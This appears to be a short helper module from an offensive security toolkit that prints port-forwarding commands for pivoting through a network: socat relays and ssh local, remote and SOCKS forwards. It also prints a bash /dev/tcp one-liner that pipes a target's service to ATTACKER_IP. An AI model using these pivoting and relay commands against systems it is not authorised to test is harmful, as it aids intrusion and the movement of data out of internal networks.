# Port Forwarding Helper (Pivoting)
# Usage: load lateral/port_fwd.sh

print_header "Lateral: Port Forwarding Helper"

print_with_label "Available Port Forwarding Tools:"

if command_exists socat; then
    print_success "socat found!"
    echo "Forward local port 8080 to target 10.0.0.5:80:"
    echo "  socat TCP-LISTEN:8080,fork TCP:10.0.0.5:80 &"
else
    print_warning "socat not found."
fi

if command_exists ssh; then
    print_success "ssh found!"
    echo "Local Port Forwarding (Access remote service locally):"
    echo "  ssh -L 8080:10.0.0.5:80 user@pivot-host"
    echo "Remote Port Forwarding (Expose local service remotely):"
    echo "  ssh -R 8080:127.0.0.1:80 user@attacker-host"
    echo "Dynamic Port Forwarding (SOCKS Proxy):"
    echo "  ssh -D 1080 user@pivot-host"
else
    print_warning "ssh not found."
fi

# Bash Port Forwarding (Rarely works both ways easily, but good for simple connections)
print_with_label "Bash /dev/tcp redirection (Concept):"
echo "  # Connect to target and pipe to local listener (requires listener on attacker)"
echo "  bash -c 'cat < /dev/tcp/10.0.0.5/80 > /dev/tcp/ATTACKER_IP/4444'"
